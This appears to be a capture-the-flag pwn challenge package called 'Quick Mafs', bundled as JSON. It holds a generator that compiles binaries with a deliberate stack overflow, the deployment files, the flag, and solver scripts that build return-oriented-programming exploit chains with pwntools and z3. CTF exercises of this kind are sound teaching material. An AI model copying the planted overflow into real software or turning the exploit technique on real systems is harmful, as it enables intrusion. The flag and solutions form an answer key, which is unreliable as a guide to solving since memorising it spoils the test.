{
    "brute-solve.py": "from random import randint, choice, shuffle\nfrom pwn import *\nimport re\nimport itertools\n\nMAX_NUM = 0xffff\nARITH_STEP_LENGTH = 10\n\nr = remote(\"localhost\", \"11001\")\nfor i in range(5):\n\tinstructions =  r.recvline().decode()\n\ttarget = int(re.search(\"call print\\(\\) with rax = (.*)\",instructions).group(1),16)\n\twith open(f\"binary{i}\",\"wb\") as f:\n\t\tf.write(bytes.fromhex(r.recvline().rstrip().decode()))\n\texe = ELF(f\"binary{i}\")\n\tprint(hex(target))\n\n\tdef chunks(lst, n):\n\t   \"\"\"Yield successive n-sized chunks from lst.\"\"\"\n\t   for i in range(0, len(lst), n):\n\t       yield lst[i:i + n]\n\n\n\twith process([\"ropper\", \"-f\", f\"binary{i}\", \"--nocolor\", \"--search\", \"lea\"]) as ropper:\n\t\tgadgets = ropper.recvall().decode()\n\t\tfound_arith_gadgets = []\n\t\tstart_addr = 0x401004\n\t\tstart = u16(exe.read(0x00401007, 2))\n\t\tconstants = [u16(x) for x in chunks(exe.read(exe.symbols['constants'], 2*160),2)]\n\t\tfor line in gadgets.split(\"\\n\"):\n\t\t\tgadget = re.search(\"(0x[0-9a-fA-F]+): lea rbx, \\[(0x[0-9a-fA-F]+)\\]; ([a-z]+) ax, word ptr \\[rbx\\]; ret;\", line)\n\t\t\tif gadget:\n\t\t\t\taddr, rhs, op = (int(gadget.group(1),16), int(gadget.group(2),16), gadget.group(3).upper())\n\t\t\t\trhs = constants[(rhs - exe.symbols['constants'])//2]\n\t\t\t\tfound_arith_gadgets.append((addr, op, rhs))\n\n\top_map = {\n\t\t\"ADD\": lambda x, y: (x + y) & MAX_NUM,\n\t\t\"SUB\": lambda x, y: (x - y) & MAX_NUM,\n\t\t\"XOR\": lambda x, y: (x ^ y) & MAX_NUM,\n\t}\n\n\top_addr_map = {(b,c): a for a,b,c in found_arith_gadgets}\n\top_op_map = {(b,c): (lambda lhs: op_map[b](lhs, c)) for a,b,c in found_arith_gadgets}\n\n\tseq = None\n\tfor possible in itertools.product(op_op_map.items(), repeat=ARITH_STEP_LENGTH):\n\t\tvalue = start\n\t\tfor op, f in possible:\n\t\t\tvalue = f(value)\n\t\tif value == target:\n\t\t\tseq = [op_addr_map[op] for op, _ in possible]\n\t\t\tbreak\n\n\tpayload = b\"A\" * 8 + p64(0x401004)\n\tfor a in seq:\n\t\tpayload += p64(a)\n\tpayload += p64(exe.symbols['print'])\n\tr.sendline(payload.hex())\n\nr.interactive()\n",
    "chall.py": "from random import randint, choice, shuffle\nimport sys, os, binascii\nfrom subprocess import run, PIPE\nfrom struct import unpack\nMAX_NUM = 0xffff\nARITH_STEP_LENGTH = 10\n\n# pls don't judge my shit code :)\n\nimport atexit\n\ncreated_challenges = []\n\n@atexit.register\ndef cleanup():\n\t# we clean up files at the end of each round but to prevent accumulation over time lets also do it onexit in case of exceptions and the like\n\tglobal created_challenges\n\tfor chall in created_challenges:\n\t\trun(f\"rm -f /tmp/{chall}*\",shell=True)\n\ndef make_operations():\n\n\tdef get_inverse(op):\n\t\treturn {\n\t\t\t\"ADD\": \"SUB\",\n\t\t\t\"SUB\": \"ADD\",\n\t\t\t\"XOR\": \"XOR\"\n\t\t}[op]\n\n\ttarget = randint(0,MAX_NUM)\n\toperations = []\n\tcurrent = target\n\tfor i in range(ARITH_STEP_LENGTH):\n\t\top = choice([\"ADD\", \"SUB\", \"XOR\"])\n\t\trhs = randint(0,MAX_NUM)\n\t\toperations.append((get_inverse(op), rhs))\n\t\tcurrent = {\n\t\t\t\"ADD\": lambda x, y: (x + y) & MAX_NUM,\n\t\t\t\"SUB\": lambda x, y: (x - y) & MAX_NUM,\n\t\t\t\"XOR\": lambda x, y: (x ^ y) & MAX_NUM,\n\t\t}[op](current, rhs)\n\n\treturn (current, target, operations[::-1])\n\nfor i in range(5):\n\tstart, target, operations = make_operations()\n\tprint(f\"call print() with rax = {hex(target)}\")\n\n\toperations += [(choice([\"ADD\", \"SUB\", \"XOR\"]), randint(0,MAX_NUM)) for x in range(150)]\n\tshuffle(operations)\n\top_gadgets = [f\"\\\"lea rbx, [constants + 2 * {idx}];{op} ax, [rbx]; ret;\\\"\" for idx, (op, rhs) in enumerate(operations)]\n\tconstants = \",\".join([f\"{rhs}U\" for op, rhs in operations])\n\top_gadgets = [f\"\\\"mov rax, {hex(start)}; ret;\\\"\"] + op_gadgets\n\tcode = \"\"\"\n\n\tunsigned short constants[160] = {{{}}};\n\n\tvoid gadgets() {{\n\t\tasm(\n\t{}\n\t\t);\n\t}}\n\n\tvoid print() {{\n\t\tasm\n\t    (\t\n\n\t    \t\"mov rdx, 2;\"\n\t    \t\"push rax;\"\n\t    \t\"mov rsi, rsp;\"\n\t    \t\"mov rdi, 1;\"\n\t        \"mov rax, 1;\"\n\t        \"syscall;\"\n\t       \t\"mov rdi, 0;\"\n\t        \"mov rax, 60;\"\n\t        \"syscall;\"\n\t    );\n\t}}\n\n\n\tint vuln() {{\n    \tasm\n\t    (\n\t        \"mov rax, 0;\"\n\t        \"mov rdi, 0;\"\n\t        \"mov rsi, rsp;\"\n\t        \"mov rdx, 0x2000;\"\n\t        \"syscall;\"\n\t    );\n\t}}\n\n\tint _start() {{\n\t\tvuln();\n\t\tasm(\"mov rax, 0;\");\n\t}}\n\n\t\"\"\".format(constants, '\\n'.join(op_gadgets))\n\n\tname = binascii.b2a_hex(os.urandom(15)).decode()\n\tcreated_challenges.append(name)\n\twith open(f\"/tmp/{name}.c\",\"w\") as f:\n\t\tf.write(code)\n\trun(f\"gcc -masm=intel -no-pie -nostdlib /tmp/{name}.c -o /tmp/{name}\",shell=True, capture_output=True)\n\trun(f\"chmod +x /tmp/{name}\",shell=True, capture_output=True)\n\twith open(f\"/tmp/{name}\",\"rb\") as f:\n\t\tprint(f.read().hex())\n\n\trequest = bytes.fromhex(input().rstrip())\n\tresult = unpack(\"<H\", run(f\"/tmp/{name}\", input=request, shell=True, capture_output=True).stdout)[0]\n\tos.system(f\"rm /tmp/{name}*\")\n\tif  result == target:\n\t\tcontinue\n\tprint(\"sorry you didn't pwn it right :(\")\n\texit(0)\n\n\nwith open(\"/pwn/flag.txt\",\"r\") as f:\n\tprint(f.read())\n\n",
    "Dockerfile": "FROM debian:buster-slim\n\n\nRUN apt-get update -y; apt-get install socat python3 build-essential -y\nADD chall.py /pwn/chall.py\nADD flag.txt /pwn/flag.txt\nWORKDIR /pwn\n\nEXPOSE 11001\n\nENTRYPOINT [\"socat\", \"-s\", \"TCP-LISTEN:11001,reuseaddr,fork\", \"EXEC:timeout 10m python3 /pwn/chall.py,stderr\"]\n",
    "flag.txt": "gigem{7w0_qu4dr1ll10n?_7h475_r34lly_qu1ck_m47h}",
    "Makefile": "NAME := quick_mafs\n\ndocker: Dockerfile\n\tdocker build -t quick_mafs .\n\nrun: docker\n\tdocker run -d --read-only --restart=always --tmpfs /tmp:exec --name $(NAME) -p 11001:11001 $(NAME)\n\n.PHONY:",
    "README.md": "# Quick Mafs\n\n## Description\n\nOops! I dropped all of these arithmetic gadgets. Fortunately there are enough of them that you won't be able to pick out the right ones.... right?\n\nThis is an automatic reversing & exploitation challenge. The server will send you (in order) an instruction (they will be in the format \"call print() with rax = 0x1234\\n\") and an ELF binary as a newline terminated hex string. You should analyze the binary, construct a payload to accomplish that, and then send it back to the server as a newline terminated hex string. To receive the flag you will need to do this 5 times within a timeout of 10 minutes. \n\n## Solution\nSee `solve.py`.\n",
    "solve.py": "from z3 import *\nfrom random import randint, choice, shuffle\nfrom pwn import *\nimport re\n\nset_param('parallel.enable', True)\n\nMAX_NUM = 0xffff\nARITH_STEP_LENGTH = 10\n\nr = remote(\"tamuctf.com\", 443, ssl=True, sni=\"quick-mafs\")\nfor i in range(5):\n\tinstructions =  r.recvline().decode()\n\ttarget = int(re.search(\"call print\\(\\) with rax = (.*)\",instructions).group(1),16)\n\twith open(f\"binary{i}\",\"wb\") as f:\n\t\tf.write(bytes.fromhex(r.recvline().rstrip().decode()))\n\texe = ELF(f\"binary{i}\")\n\tprint(hex(target))\n\n\tdef chunks(lst, n):\n\t   \"\"\"Yield successive n-sized chunks from lst.\"\"\"\n\t   for i in range(0, len(lst), n):\n\t       yield lst[i:i + n]\n\n\n\twith process([\"ropper\", \"-f\", f\"binary{i}\", \"--nocolor\", \"--search\", \"lea\"]) as ropper:\n\t\tgadgets = ropper.recvall().decode()\n\t\tfound_arith_gadgets = []\n\t\tstart_addr = 0x401004\n\t\tstart = u16(exe.read(0x00401007, 2))\n\t\tconstants = [u16(x) for x in chunks(exe.read(exe.symbols['constants'], 2*160),2)]\n\t\tfor line in gadgets.split(\"\\n\"):\n\t\t\tgadget = re.search(\"(0x[0-9a-fA-F]+): lea rbx, \\[(0x[0-9a-fA-F]+)\\]; ([a-z]+) ax, word ptr \\[rbx\\]; ret;\", line)\n\t\t\tif gadget:\n\t\t\t\taddr, rhs, op = (int(gadget.group(1),16), int(gadget.group(2),16), gadget.group(3).upper())\n\t\t\t\trhs = constants[(rhs - exe.symbols['constants'])//2]\n\t\t\t\tfound_arith_gadgets.append((addr, op, rhs))\n\n\top_map = {\n\t\t\"ADD\": lambda x, y: (x + y) & MAX_NUM,\n\t\t\"SUB\": lambda x, y: (x - y) & MAX_NUM,\n\t\t\"XOR\": lambda x, y: (x ^ y) & MAX_NUM,\n\t}\n\n\top_num_map = {\n\t\t\"ADD\": 0,\n\t\t\"SUB\": 1,\n\t\t\"XOR\": 2,\n\t}\n\n\top_addr_map = {(b,c): a for a,b,c in found_arith_gadgets}\n\n\toperations = [(b,c) for a,b,c in found_arith_gadgets]\n\n\toperations = [(op_map[op],op_num_map[op], rhs) for op, rhs in operations]\n\n\tprint(f'starting gadget {hex(start)}, target is {hex(target)}')\n\n\ts = Solver()\n\n\tvals =  [BitVec(f'vals{i}',64) for i in range(ARITH_STEP_LENGTH)]# + [BitVec('target',64)]\n\tops = [Int(f'ops{i}') for i in range(ARITH_STEP_LENGTH)]\n\toperands = [Int(f'operands{i}') for i in range(ARITH_STEP_LENGTH)]\n\tstart = BitVecVal(start,64)\n\ttarget = BitVecVal(target,64)\n\n\n\ts.add(Or([And(operands[0] == rhs, ops[0] == op_int, op(start, rhs) == vals[0]) for op, op_int, rhs in operations]))\n\n\tfor i in range(ARITH_STEP_LENGTH-1):\n\t\ts.add(Or([And(operands[i+1] == rhs, ops[i+1] == op_int, op(vals[i], rhs) == vals[i+1]) for op, op_int, rhs in operations]))\n\n\ts.add(vals[-1] == target)\n\n\tnum_op_map = {\n\t\t0: \"ADD\",\n\t\t1: \"SUB\",\n\t\t2: \"XOR\"\n\t}\n\n\tif s.check() == sat:\n\t\tmodel = s.model()\n\t\tpayload = b\"A\" * 8 + p64(0x401004)\n\t\tfor i in range(ARITH_STEP_LENGTH):\n\t\t\tpayload += p64(op_addr_map[(num_op_map[model[ops[i]].as_long()], model[operands[i]].as_long())])\n\t\t\tprint(f\"{num_op_map[model[ops[i]].as_long()]} {hex(model[operands[i]].as_long())} -> {hex(model[vals[i]].as_long())}\")\n\t\tpayload += p64(exe.symbols['print'])\n\t\tr.sendline(payload.hex())\n\telse:\n\t\tprint(\"unsat :(1\")\nprint(r.recvall())\n",
    "solver-template.py": "from pwn import *\n\np = remote(\"tamuctf.com\", 443, ssl=True, sni=\"quick-mafs\")\nfor binary in range(5):\n\tinstructions = p.recvline() # the server will give you instructions as to what your exploit should do\n\twith open(\"elf\", \"wb\") as file:\n\t\tfile.write(bytes.fromhex(p.recvline().rstrip().decode()))\n\n\t# send whatever data you want\n\tp.sendline(b\"howdy\".hex())\np.interactive()\n",
    "category": "pwn"
}